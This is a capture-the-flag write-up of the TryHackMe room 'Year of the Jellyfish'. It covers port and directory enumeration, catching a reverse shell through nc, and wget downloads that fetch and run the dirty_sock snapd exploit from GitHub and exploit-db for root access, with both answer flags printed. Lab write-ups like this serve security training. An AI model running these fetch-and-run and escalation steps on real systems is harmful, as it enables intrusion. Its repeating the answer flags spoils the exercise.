<h1 align="center">Year of the Jellyfish</h1>
<p align="center">July 31, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>451</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Some boxes sting...</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/01604da2-cb70-418c-8b90-a487cc81ed81"><br>
Click <a href="https://tryhackme.com/room/yearofthejellyfish">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/c52fbda8-e5dc-4962-8c43-db78ac8dba17"></p>

<br>

<h2>Task 1 .Flags</h2>
<p>Hack your way in. Get the Flags. Don't get stung.<br>

Be warned -- this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed...<br>

This box was part of a competition giving away an OSCP voucher and five TryHackMe subscription vouchers. The competition has now ended, and the winners can be found in the TryHackMe Discord.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Flag 1<br>
<code>THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}</code></p>

<br>

<p>1.2. Root Flag<br>
<code>THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}</code></p>


<h3>Nmap</h3>

```bash
:~/Jellyfish# nmap -p- -vv TargetIP
...
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack ttl 63
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
443/tcp   open  https      syn-ack ttl 63
8000/tcp  open  http-alt   syn-ack ttl 63
8096/tcp  open  unknown    syn-ack ttl 63
22222/tcp open  easyengine syn-ack ttl 63
```

<h3>/etc/hosts</h3>

```bash
TargetIP    robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm
```

<h3>ffuf</h3>

```bash
:~/YearOfTheJellyfish# ffuf -u https://robyns-petshop.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -fr '/\..*'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://robyns-petshop.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: /\..*
________________________________________________

content                 [Status: 301, Size: 328, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 327, Words: 20, Lines: 10]
business                [Status: 401, Size: 466, Words: 42, Lines: 15]
...
plugins                 [Status: 301, Size: 328, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 327, Words: 20, Lines: 10]
config                  [Status: 301, Size: 327, Words: 20, Lines: 10]
LICENSE                 [Status: 200, Size: 1085, Words: 156, Lines: 22]
```

<h3>monitorr.robyns-petshop.thm</h3>
<p>

- Monitorr version 1.7.6
</p>

<img width="1066" height="537" alt="image" src="https://github.com/user-attachments/assets/b527311f-1658-4059-b4b1-0ae6e1bf8414" />

<h3>beta.robybs-petshop.thm</h3>h3>

<img width="1069" height="258" alt="image" src="https://github.com/user-attachments/assets/2142ccb3-38d2-46cd-befc-f710b049b038" />


<h3>10.10.185.86>8096</h3>

```bash
:~/YearOfTheJellyFish# curl -s http://robyns-petshop.thm:8096/system/info/public/
{
  "LocalAddress":"http://10.10.185.86:8096", 
  "ServerName":"petshop",
  "Version":"10.7.2",
  "ProductName":"Jellyfin Server",
  "OperatingSystem":"Linux",
  "Id":"b6c698509b83439992b3e437c87f7fb5",
  "StartupWizardCompleted":true
}
```

<p>10.10.185.86:8096/web/index.html#!/login.html?serverid=b6c698509b83439992b3e437c87f7fb5</p>

<img width="1057" height="485" alt="image" src="https://github.com/user-attachments/assets/17f0a32e-f405-4f51-b471-dbfef36edf63" />


<h3>monitorr.robyns-petshop.thm/settings.php</h3>

<img width="1063" height="637" alt="image" src="https://github.com/user-attachments/assets/fc088d66-7471-4793-9572-5f79fe3e7fc7" />

<img width="1127" height="381" alt="image" src="https://github.com/user-attachments/assets/0cf1a22b-58ea-4275-af01-b4c3d2910650" />


<img width="1119" height="253" alt="image" src="https://github.com/user-attachments/assets/83f6a820-cb61-46fb-aae2-aec2e28f7dc1" />


```bash
:~# nc -nlvp 443
...
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ which python3
which python3
/usr/bin/python3
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<img$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ export TERM=xterm
export TERM=xterm
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ^Z
[1]+  Stopped                 nc -nlvp 443
:~/YearOfTheJellyFish# stty raw -echo; fg
nc -nlvp 443

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ 
```

```bash
www-data@petshop:/var/www$ ls
dev  flag1.txt	html  monitorr
www-data@petshop:/var/www$ ls -lah
total 24K
drwxr-xr-x  5 root     root     4.0K Apr 30  2021 .
drwxr-xr-x 14 root     root     4.0K Apr  9  2021 ..
drwxr-xr-x  9 root     root     4.0K Apr 11  2021 dev
-r--------  1 www-data www-data   38 Apr 30  2021 flag1.txt
drwxr-xr-x  9 root     root     4.0K Apr 11  2021 html
drwxr-xr-x  4 www-data www-data 4.0K Apr 11  2021 monitorr
www-data@petshop:/var/www$ cat flag1.txt
THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}
www-data@petshop:/var/www$ 
```


<h3>linpeas.sh</h3>

<h4>46362.py</h4>

```bash
www-data@petshop:/dev/shm$ wget https://github.com/initstring/dirty_sock/archive/
...
master.zip              [ <=>                ]  21.86K  --.-KB/s    in 0.001s
```

```bash
...www-data@petshop:/dev/shm$ 
www-data@petshop:/dev/shm$ unzip master.zip
Archive:  master.zip
c68e35ae3eb7f49a398c7d7f35bb920c79dc9b0e
   creating: dirty_sock-master/
   creating: dirty_sock-master/.github/
   creating: dirty_sock-master/.github/ISSUE_TEMPLATE/
  inflating: dirty_sock-master/.github/ISSUE_TEMPLATE/bug_report.md  
  inflating: dirty_sock-master/LICENSE  
  inflating: dirty_sock-master/README.md  
  inflating: dirty_sock-master/dirty_sockv1.py  
  inflating: dirty_sock-master/dirty_sockv2.py
```

```bash
www-data@petshop:/dev/shm$ ls
dirty_sock-master  master.zip
```

```bash
www-data@petshop:/dev/shm$ cd dirty_sock-master
www-data@petshop:/dev/shm/dirty_sock-master$ ls
LICENSE  README.md  dirty_sockv1.py  dirty_sockv2.py
```

```bash
www-data@petshop:/dev/shm/dirty_sock-master$ chmod +x dirty_sockv2.py
www-data@petshop:/dev/shm/dirty_sock-master$ ./dirty_sockv2.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/tahqkleisc;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
Traceback (most recent call last):
  File "./dirty_sockv2.py", line 246, in <module>
    main()
  File "./dirty_sockv2.py", line 236, in main
    delete_snap(client_sock)
  File "./dirty_sockv2.py", line 121, in delete_snap
    http_reply = client_sock.recv(8192).decode("utf-8")
ConnectionResetError: [Errno 104] Connection reset by peer
```

```bash
www-data@petshop:/dev/shm/dirty_sock-master$ ./dirty_sockv2.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/mfqjgjbpuv;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Thu, 31 Jul 2025 xx:xx1:xx GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

```bash
www-data@petshop:/dev/shm$ wget https://www.exploit-db.com/download/46362
...
46362                   [ <=>                ]  13.50K  --.-KB/s    in 0.06s   
...
```

```bash
www-data@petshop:/dev/shm$ ls
46362  dirty_sock-master  master.zip
```

```bash
www-data@petshop:/dev/shm$ mv 46362 46362.py
```

```bash
www-data@petshop:/dev/shm$ chmod +x 46362.py
```

```bash
www-data@petshop:/dev/shm$ python3 46362.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/skddvyetgr;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Thu, 31 Jul 2025 xx:xx:xx GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

```bash
www-data@petshop:/dev/shm$ grep "dirty_sock" /etc/passwd
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
```

```bash
www-data@petshop:/dev/shm/dirty_sock-master$ python3 dirty_sockv2.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/ibateoiyrp;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Thu, 31 Jul 2025 xx:xx:xx GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

```bash
www-data@petshop:/dev/shm/dirty_sock-master$ su dirty_sock
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@petshop:/dev/shm/dirty_sock-master$ sudo -s
[sudo] password for dirty_sock: 
root@petshop:/dev/shm/dirty_sock-master# cat /root/root.txt
THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}
root@petshop:/dev/shm/dirty_sock-master# 
```

<img width="1171" height="484" alt="image" src="https://github.com/user-attachments/assets/5a2faac8-906c-46a8-9f38-0a2ee1712745" />

<img width="1174" height="485" alt="image" src="https://github.com/user-attachments/assets/fe310a4d-847e-417d-a927-ea36e88feb73" />




<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/30029977-5e81-48cb-915d-e47ac53995f9"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/83c7a185-7ef1-49ba-85c8-19a3ae0f4922"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 31, 2025     | 451      |     143ʳᵈ    |      5ᵗʰ     |     127ᵗʰ   |     7ᵗʰ    | 118,170  |    886    |    72     |


</div>

<p align="center">Global All Time:   143ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/b7b4c11d-64ac-4212-9c1a-5dc222b232c5"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/484b5155-2b07-469a-b1c6-103ddc6cbc07"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/28e57422-cc57-4665-917e-667239cd10a1"><br>
                  Global monthly:    127ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d2294d73-1256-4820-aa49-01e2ceb3f815"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f1658b2a-2706-4ae0-93e3-8bb50563569f"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
